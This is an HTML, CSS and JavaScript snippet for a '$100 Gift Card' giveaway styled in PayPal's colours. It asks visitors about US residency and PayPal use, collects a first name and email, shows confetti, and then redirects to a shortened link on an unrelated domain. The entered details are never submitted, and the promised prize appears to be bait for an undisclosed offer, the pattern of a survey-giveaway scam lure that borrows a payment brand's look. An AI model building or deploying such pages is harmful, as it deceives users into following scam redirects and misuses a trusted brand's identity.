<div id="pp-giveaway-wrapper">

<style>
#pp-giveaway-wrapper {
  font-family: Arial, sans-serif;
  max-width: 500px;
  margin: 40px auto;
  background: #ffffff;
  padding: 25px;
  border-radius: 15px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
  text-align: center;
}

#pp-giveaway-wrapper h1 {
  color: #003087;
  font-size: 24px;
  margin-bottom: 10px;
}

#pp-giveaway-wrapper .highlight {
  color: #009cde;
  font-size: 28px;
  font-weight: bold;
}

#pp-giveaway-wrapper .step { display: none; }
#pp-giveaway-wrapper .step.active { display: block; }

#pp-giveaway-wrapper button {
  width: 100%;
  padding: 14px;
  margin-top: 10px;
  background: #0070ba;
  color: #fff;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  cursor: pointer;
  transition: 0.3s;
}

#pp-giveaway-wrapper button:hover {
  background: #003087;
}

#pp-giveaway-wrapper .option-btn {
  background: #f2f2f2;
  color: #333;
}

#pp-giveaway-wrapper .option-btn:hover {
  background: #009cde;
  color: #fff;
}

#pp-giveaway-wrapper input {
  width: 100%;
  padding: 12px;
  margin-top: 8px;
  border-radius: 8px;
  border: 1px solid #ccc;
}

#pp-giveaway-wrapper .footer {
  font-size: 12px;
  color: #666;
  margin-top: 15px;
}

@media (max-width:600px){
  #pp-giveaway-wrapper {
    margin: 20px;
    padding: 20px;
  }
}
</style>

<canvas id="confettiCanvas" style="position:fixed;top:0;left:0;pointer-events:none;"></canvas>

<h1>Win a <span class="highlight">$100 Gift Card</span></h1>
<p>US Residents Only – Limited Promotion</p>

<!-- STEP 1 -->
<div class="step active">
  <h3>Are you a US resident?</h3>
  <button class="option-btn" onclick="nextStep()">Yes</button>
  <button class="option-btn">No</button>
</div>

<!-- STEP 2 -->
<div class="step">
  <h3>How often do you use PayPal?</h3>
  <button class="option-btn" onclick="nextStep()">Daily</button>
  <button class="option-btn" onclick="nextStep()">Weekly</button>
  <button class="option-btn" onclick="nextStep()">Rarely</button>
</div>

<!-- STEP 3 -->
<div class="step">
  <h3>Enter Your Details</h3>
  <form id="ppForm">
    <input type="text" placeholder="First Name" required>
    <input type="email" placeholder="Email Address" required>
    <button type="submit">Check Availability</button>
  </form>
</div>

<div class="footer">
No purchase necessary. 18+ US residents only.  
Not sponsored, endorsed, or administered by PayPal.
</div>

<script>
function nextStep(){
  const steps = document.querySelectorAll('#pp-giveaway-wrapper .step');
  let current = 0;
  steps.forEach((step, i)=>{
    if(step.classList.contains('active')){
      current = i;
      step.classList.remove('active');
    }
  });
  steps[current+1].classList.add('active');
}

document.getElementById("ppForm").addEventListener("submit", function(e){
  e.preventDefault();
  launchConfetti();
  setTimeout(function(){
    window.location.href="https://confirmapp.store/sl/1zpkq";
  },1500);
});

/* Confetti */
function launchConfetti(){
  const canvas=document.getElementById('confettiCanvas');
  const ctx=canvas.getContext('2d');
  canvas.width=window.innerWidth;
  canvas.height=window.innerHeight;

  const pieces=[];
  for(let i=0;i<120;i++){
    pieces.push({
      x:Math.random()*canvas.width,
      y:Math.random()*canvas.height,
      r:Math.random()*6+4,
      d:Math.random()*50,
      color:["#003087","#0070ba","#009cde","#ffd700"][Math.floor(Math.random()*4)]
    });
  }

  function draw(){
    ctx.clearRect(0,0,canvas.width,canvas.height);
    pieces.forEach(p=>{
      ctx.beginPath();
      ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
      ctx.fillStyle=p.color;
      ctx.fill();
      p.y+=Math.cos(p.d)+1+p.r/2;
      if(p.y>canvas.height) p.y=-10;
    });
  }

  setInterval(draw,20);
}
</script>

</div>
